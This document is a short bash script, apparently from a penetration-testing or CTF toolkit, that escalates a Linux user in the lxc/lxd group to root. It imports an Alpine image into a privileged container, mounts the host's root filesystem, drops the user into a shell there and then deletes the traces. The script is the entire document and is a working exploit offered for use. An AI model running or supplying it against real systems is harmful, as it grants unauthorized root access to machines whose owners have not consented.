#!/bin/bash

# privesc when user is in lxc/lxd group
# upload this file and alpine image to /dev/shm
# may need to run lxd init

lxc image import alpine.tar.gz --alias zxcv &> /dev/null
lxc init zxcv Czxcv -c security.privileged=true &> /dev/null
lxc config device add Czxcv Dzxcv disk source=/ path=/mnt/root &> /dev/null
lxc start Czxcv

echo 'Run "cd /mnt/root" to access root directory'
echo 'Type "exit" when done'

lxc exec Czxcv /bin/sh

echo 'Cleaning up'

lxc stop Czxcv
lxc delete Czxcv
lxc image delete zxcv

echo 'Done'
